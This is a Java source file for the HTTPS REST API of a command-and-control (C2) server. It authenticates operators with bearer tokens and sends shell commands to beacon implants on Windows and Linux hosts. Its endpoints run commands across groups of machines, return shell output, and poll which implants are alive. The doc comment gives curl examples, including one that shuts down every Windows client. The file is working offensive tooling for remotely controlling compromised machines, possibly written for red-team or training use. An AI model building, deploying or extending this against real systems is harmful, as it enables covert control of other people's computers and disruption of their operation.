package Servers.C2;

import java.io.*;
import java.net.InetSocketAddress;
import java.security.KeyStore;
import java.security.SecureRandom;
import java.time.Instant;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

import javax.net.ssl.KeyManagerFactory;
import javax.net.ssl.TrustManagerFactory;
import com.sun.net.httpserver.*;
import javax.net.ssl.SSLEngine;
import javax.net.ssl.SSLParameters;

import org.json.JSONObject;

import javax.net.ssl.SSLContext;

public class C2ServerAPI implements Runnable {
    // Pointer back to the C2 Server
    private C2Server C2server; 

    // Maps that store data about bearer tokens
    private HashMap<String, String> bearerTokens;
    private HashMap<String, Instant> bearerTokensExpirationTime;

    // Secure Random Number Generator used to generate bearer tokens
    private final SecureRandom secRNG;

    public C2ServerAPI(C2Server C2server){
        this.C2server = C2server;
        this.secRNG = new SecureRandom();
        this.bearerTokens = new HashMap<>();
        this.bearerTokensExpirationTime = new HashMap<>();
    }

    /**
     * Generates a oauth2 bearer token. This token is presented to a client once they have successfully authenticated
     * The client must present this token each time they attempt to use the API after this. The token is valid for one hour
     * @param username - username that this token is associated with
     * @return bearer token
     */
    private String generateBearerToken(String username){
        String hexChars = "0123456789abcdef";
        StringBuilder hexString = new StringBuilder(32);
        for (int i = 0; i < 32; i++) {
            hexString.append(hexChars.charAt(secRNG.nextInt(hexChars.length())));
        }
        bearerTokens.put(hexString.toString(), username);
        bearerTokensExpirationTime.put(hexString.toString(), Instant.now().plusSeconds(3600));
        return hexString.toString();
    }

    /**
     * Determines whether or not a oauth2 bearer token that has been presented is valid
     * 
     * @param bearerToken - bearer token to be validated
     * @return true or false
     */
    private boolean validateBearerToken(String bearerToken){
        if(bearerTokensExpirationTime.keySet().contains(bearerToken)){
            return Instant.now().isBefore(bearerTokensExpirationTime.get(bearerToken)); 
        }
        return false;
    }


    public class MyHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange t) throws IOException {
            
            String response = "";

            /**
             * There are 6 different RESTful API calls available currently
             * 
             * /auth
             * The Client will use basic authentication to present a username and password
             * and will receive a oauth2 bearer token
             * 
             * Example:
             * 
             * curl -u root:password https://localhost:8000/auth
             * 
             * Output:
             * 
             * {"bearer":"oauth2bearertoken","ttl",3600}
             * 
             * 
             * 
             * Note: Every other request requires presenting a valid bearer token, previously obtained from the /auth call
             * 
             * /command
             * Sends a command to a specific number of clients, determined by the scope
             * 
             * Example (sends whoami to all clients):
             * 
             * curl --oauth2-bearer oauth2bearertoken -d '{"scope":"x.x.x.x","command":"whoami"}' https://localhost:8000/command
             * 
             * Example (sends ipconfig to one client):
             * 
             * curl --oauth2-bearer oauth2bearertoken -d '{"scope":"192.168.1.1","command":"ipconfig"}' https://localhost:8000/command
             * 
             * Example (shutsdown all windows clients):
             * 
             * curl --oauth2-bearer oauth2bearertoken -d '{"scope":"Windows","command":"shutdown /t 0"}' https://localhost:8000/command
             * 
             * Output (for any command run):
             * 
             * success
             * 
             * 
             * 
             * /shell
             * Does the same thing as /command, except the output (std.out) is returned right away. scope should only be one ip address
             * 
             * Example:
             * 
             * curl --oauth2-bearer oauth2bearertoken -d '{"scope":"192.168.1.1","command":"whoami"}' https://localhost:8000/shell
             * 
             * Output:
             * 
             * root
             * 
             * 
             * /responses
             * Returns all responses from clients specified by scope
             * 
             * Example:
             * 
             * curl --oauth2-bearer oauth2bearertoken -d '{"scope":"x.x.x.x"}' https://localhost:8000/responses
             * 
             * Output:
             * 
             * {"192.168.229.136":["nt authority\\system"],"192.168.229.128":[]}
             * 
             * 
             * 
             * /status
             * Gets the status of all clients. It attempts to run whoami on all systems, and if the correct output is returned, then the status is true
             * 
             * 
             * Example:
             * 
             * curl --oauth2-bearer oauth2bearertoken https://localhost:8000/status
             * 
             * Output:
             * 
             * {"192.168.229.136":false,"192.168.229.128":true}
             * 
             * 
             * 
             * 
             * /user
             * Adds a user to the C2 Server, or changes the password of a user in the C2 Server
             * NOTE: This endpoint is only accessible to the root user (i.e. username "root" and root's password must've been used to generate bearer token used)
             * 
             * Example:
             * 
             * curl --oauth2-bearer oauth2bearertoken -d '{"username":"username","password","password"}' https://localhost:8000/user
             * 
             * Output:
             * 
             * success
             * 
             */

            // First, the client needs to present their username and password, to get a BEARER token
            if(t.getRequestURI().toString().equals("/auth") && t.getRequestMethod().equals("GET")){
                String auth = t.getRequestHeaders().get("Authorization").get(0);
                if(auth.split(" ")[0].equals("Basic")){
                    String userpass = new String(Base64.getDecoder().decode(auth.split(" ")[1]));
                    String username = userpass.split(":")[0];
                    String password = userpass.split(":")[1];
                    if(C2server.authenticate(username, C2Server.hashPassword(password))){
                        String bearerToken = generateBearerToken(username);
                        JSONObject jsonBearerObject = new JSONObject();
                        jsonBearerObject.put("ttl", 3600);
                        jsonBearerObject.put("bearer", bearerToken);
                        response = jsonBearerObject.toString();
                        t.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
                        t.sendResponseHeaders(200, response.getBytes().length);
                    } else {
                        t.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
                        t.sendResponseHeaders(401, response.getBytes().length);
                    }
                }
            } else if (validateBearerToken(t.getRequestHeaders().get("Authorization").get(0).split(" ")[1])){
                if(t.getRequestURI().toString().equals("/status") && t.getRequestMethod().equals("GET")){
                    System.out.println(t.getRequestHeaders());
                    C2server.distributeCommandToBeacons("Windows", "whoami");
                    C2server.distributeCommandToBeacons("Linux", "whoami");
                    try{
                        Thread.sleep(1000);
                    } catch(InterruptedException e){
                        e.printStackTrace();
                    }
                    JSONObject clientStatusJSONObject = new JSONObject(C2server.getClientStatus()); 
                    response = clientStatusJSONObject.toString();
                } else if (t.getRequestURI().toString().equals("/responses") && t.getRequestMethod().equals("POST")){
                    // Proper scopes are Linux, Windows, or an ipv4 address, (wildcards are excepted, i.e. 192.168.x.1)
                    JSONObject responseScope = new JSONObject(new String(t.getRequestBody().readAllBytes()));
                    JSONObject responses = new JSONObject(C2server.getClientResponses(responseScope.get("scope").toString()));
                    
                    response = responses.toString();
                } else if (t.getRequestURI().toString().equals("/command") && t.getRequestMethod().equals("POST")){
                    JSONObject commandJSON = new JSONObject(new String(t.getRequestBody().readAllBytes()));
                    String scope = commandJSON.get("scope").toString();
                    String command = commandJSON.get("command").toString();
                    C2server.distributeCommandToBeacons(scope, command);
                    response = "success";
                } else if (t.getRequestURI().toString().equals("/shell") && t.getRequestMethod().equals("POST")){
                    JSONObject shellJSON = new JSONObject(new String(t.getRequestBody().readAllBytes()));
                    String scope = shellJSON.get("scope").toString();
                    String command = shellJSON.get("command").toString();
    
                    int numResponses = C2server.getClientResponses(scope).get(scope).size();
                    C2server.getShellResponse(scope, command);
                    ArrayList<String> clientResponses = C2server.getClientResponses(scope).get(scope);
                    for(int i = numResponses; i < clientResponses.size(); i++){
                        response += clientResponses.get(i);
                    }
                } else if (t.getRequestURI().toString().equals("/user") && t.getRequestMethod().equals("POST") && bearerTokens.get(t.getRequestHeaders().get("Authorization").get(0).split(" ")[1]).equals("root")){
                    JSONObject shellJSON = new JSONObject(new String(t.getRequestBody().readAllBytes()));
                    String username = shellJSON.get("username").toString();
                    String password = shellJSON.get("password").toString();
                    C2server.updateUsernamePassword(username, C2Server.hashPassword(password));
                    response = "success";

                }
                t.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
                t.sendResponseHeaders(200, response.getBytes().length);
            } else {
                t.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
                t.sendResponseHeaders(401, response.getBytes().length);
            }
            
            
            OutputStream os = t.getResponseBody();
            os.write(response.getBytes());
            os.close();
        }
    }

    @Override
    public void run() {
        try {
            // setup the socket address
            InetSocketAddress address = new InetSocketAddress(8000);

            // initialise the HTTPS server
            HttpsServer httpsServer = HttpsServer.create(address, 0);
            SSLContext sslContext = SSLContext.getInstance("TLS");

            // initialise the keystore
            char[] password = "password".toCharArray();
            KeyStore ks = KeyStore.getInstance("JKS");
            FileInputStream fis = new FileInputStream("testkey.jks");
            ks.load(fis, password);

            // setup the key manager factory
            KeyManagerFactory kmf = KeyManagerFactory.getInstance("SunX509");
            kmf.init(ks, password);

            // setup the trust manager factory
            TrustManagerFactory tmf = TrustManagerFactory.getInstance("SunX509");
            tmf.init(ks);

            // setup the HTTPS context and parameters
            sslContext.init(kmf.getKeyManagers(), tmf.getTrustManagers(), null);
            httpsServer.setHttpsConfigurator(new HttpsConfigurator(sslContext) {
                public void configure(HttpsParameters params) {
                    try {
                        // initialise the SSL context
                        SSLContext context = getSSLContext();
                        SSLEngine engine = context.createSSLEngine();
                        

                        // Set the SSL parameters
                        SSLParameters sslParameters = context.getSupportedSSLParameters();
                        sslParameters.setNeedClientAuth(false);
                        sslParameters.setCipherSuites(engine.getEnabledCipherSuites());
                        sslParameters.setProtocols(engine.getEnabledProtocols());
                        params.setSSLParameters(sslParameters);

                    } catch (Exception ex) {
                        System.out.println("Failed to create HTTPS port");
                    }
                }
            });
            httpsServer.createContext("/command", new MyHandler());
            httpsServer.createContext("/shell", new MyHandler());
            httpsServer.createContext("/response", new MyHandler());
            httpsServer.createContext("/status", new MyHandler());
            httpsServer.createContext("/auth", new MyHandler());
            httpsServer.createContext("/user", new MyHandler());
            httpsServer.setExecutor(new ThreadPoolExecutor(4, 8, 30, TimeUnit.SECONDS, new ArrayBlockingQueue<Runnable>(100)));
            httpsServer.start();

        } catch (Exception exception) {
            System.out.println("Failed to create HTTPS server on port " + 8000 + " of localhost");
            exception.printStackTrace();
        }
    }
}
